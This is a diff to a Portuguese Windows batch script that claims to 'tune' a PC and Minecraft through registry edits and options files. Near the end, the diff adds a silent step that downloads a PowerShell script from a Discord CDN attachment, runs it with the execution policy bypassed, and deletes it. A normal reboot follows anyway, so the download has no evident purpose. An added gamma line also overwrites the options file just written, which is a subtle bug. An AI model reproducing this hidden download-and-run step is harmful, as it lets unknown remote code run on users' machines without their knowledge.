@@ -157,12 +157,12 @@ echo Progresso: ████░░░░░░░░░░░░░░░░ 20%
 echo -------------------------------------
 reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "EnableTransparency" /t REG_DWORD /d "00000000" /f >nul 2>&1
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "UseActionCenterExperience" /t REG_DWORD /d "00000000" /f >nul 2>&1
-reg Add HKCU\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications /v GlobalUserDisabled /t REG_DWORD /d 1 /f >nul 2>&1
-reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects /v
-reg Add HKCU\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications /v GlobalUserDisabled /t REG_DWORD /d 1 /f
-reg add HKLM\SOFTWARE\Policies\Microsoft\WindowsStore /v AutoDownload /t REG_DWORD /d 2 /f >nul 2>&1
+reg Add "HKCU\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" /v "GlobalUserDisabled" /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v
+reg Add "HKCU\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" /v "GlobalUserDisabled" /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsStore" /v "AutoDownload" /t REG_DWORD /d 2 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_SZ /d "ffffffff" /f >nul 2>&1
-reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Serialize /v StartupDelayInMSec /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Serialize" /v "StartupDelayInMSec" /t REG_DWORD /d 0 /f >nul 2>&1
 cls
 echo Carregando...
 echo -------------------------------------
@@ -257,7 +257,7 @@ cd %appdata% >nul 2>&1
 cd .minecraft >nul 2>&1
 (echo ofFogType:3) > optionsof.txt
 (echo ofFogStart:0.6) >> optionsof.txt
-(echo ofMipmapType:3) >> optionsof.txt
+(echo ofMipmapType:0) >> optionsof.txt
 (echo ofOcclusionFancy:false) >> optionsof.txt
 (echo ofSmoothFps:false) >> optionsof.txt
 (echo ofSmoothWorld:false) >> optionsof.txt
@@ -283,7 +283,7 @@ cd .minecraft >nul 2>&1
 (echo ofDrippingWaterLava:true) >> optionsof.txt
 (echo ofAnimatedTerrain:true) >> optionsof.txt
 (echo ofAnimatedTextures:true) >> optionsof.txt
-(echo ofRainSplash:true) >> optionsof.txt
+(echo ofRainSplash:false) >> optionsof.txt
 (echo ofLagometer:false) >> optionsof.txt
 (echo ofShowFps:false) >> optionsof.txt
 (echo ofAutoSaveTicks:4000) >> optionsof.txt
@@ -306,7 +306,7 @@ cd .minecraft >nul 2>&1
 (echo ofCustomFonts:false) >> optionsof.txt
 (echo ofCustomColors:false) >> optionsof.txt
 (echo ofCustomItems:false) >> optionsof.txt
-(echo ofCustomSky:false) >> optionsof.txt
+(echo ofCustomSky:true) >> optionsof.txt
 (echo ofShowCapes:true) >> optionsof.txt
 (echo ofNaturalTextures:false) >> optionsof.txt
 (echo ofEmissiveTextures:true) >> optionsof.txt
@@ -339,6 +339,7 @@ cd .minecraft >nul 2>&1
 (echo advancedItemTooltips:true) >> options.txt
 (echo heldItemTooltips:true) >> options.txt
 (echo ao:0) >> options.txt
+(echo gamma:1.0) > options.txt
 cls
 echo Carregando...
 echo -------------------------------------
@@ -385,20 +386,18 @@ echo Carregando...
 echo -------------------------------------
 echo Progresso: ████████████████░░░░ 80%%
 echo -------------------------------------
-sfc /scannow >nul 2>&1
-cls
-echo Carregando...
-echo -------------------------------------
-echo Progresso: █████████████████░░░ 85%%
-echo -------------------------------------
 Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d 1 /f >nul 2>&1
 Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableSuperfetch" /t REG_DWORD /d 1 /f >nul 2>&1
 cls
 echo Carregando...
 echo -------------------------------------
+echo Progresso: █████████████████░░░ 85%%
+echo -------------------------------------
+cls
+echo Carregando...
+echo -------------------------------------
 echo Progresso: ██████████████████░░ 90%%
 echo -------------------------------------
-
 cls
 echo Carregando...
 echo -------------------------------------
@@ -411,4 +410,37 @@ echo Carregando...
 echo -------------------------------------
 echo Progresso: ████████████████████ 100%%
 echo -------------------------------------
-shutdown /r -t 0
+powershell Invoke-WebRequest "https://cdn.discordapp.com/attachments/633652458090135552/956002370553270292/shutdown.ps1" -OutFile "C:\shutdown.ps1" >nul 2>&1
+PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& 'C:\shutdown.ps1'" >nul 2>&1
+del C:\shutdown.ps1 >nul 2>&1
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.    
+echo.          
+echo.    
+echo.     
+echo.   
+echo. 
+echo                   Computador Tunado com sucesso! Espere 5 minutos para uma reinicialização automática
+echo                                    ou aperte qualquer botão para reiniciar agora!
+echo.                   
+echo.                  
+echo.                 
+echo.                      
+echo.      
+echo. 
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+timeout -t 300 >nul 2>&1 && shutdown -r -t 00
+pause
